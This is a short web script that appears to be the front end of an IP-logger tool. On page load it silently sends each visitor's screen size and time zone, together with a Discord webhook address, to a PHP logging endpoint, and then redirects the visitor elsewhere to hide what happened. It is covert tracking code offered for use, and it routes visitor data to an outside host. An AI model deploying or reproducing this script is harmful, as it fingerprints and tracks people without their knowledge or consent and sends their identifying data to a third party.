<script>
var webhook = "https://discord.com/api/webhooks/217983781290312938/QbesUFNT7I8ygh8PmJ_SkyQ_1536C9rwOyeBsHihiiuUIjkhGYgYiBoOSGDHSAyG_w0o";
var redirect = "https://graysuit.github.io";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() { 
    if (this.readyState == 4) {
        window.location = redirect;
    } 
};
xhr.open('POST', 'iplogger.php', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send('url=' + webhook + "&Width=" + window.screen.width + "&Height=" + window.screen.height + "&TimeZone=" + Intl.DateTimeFormat().resolvedOptions().timeZone);
</script>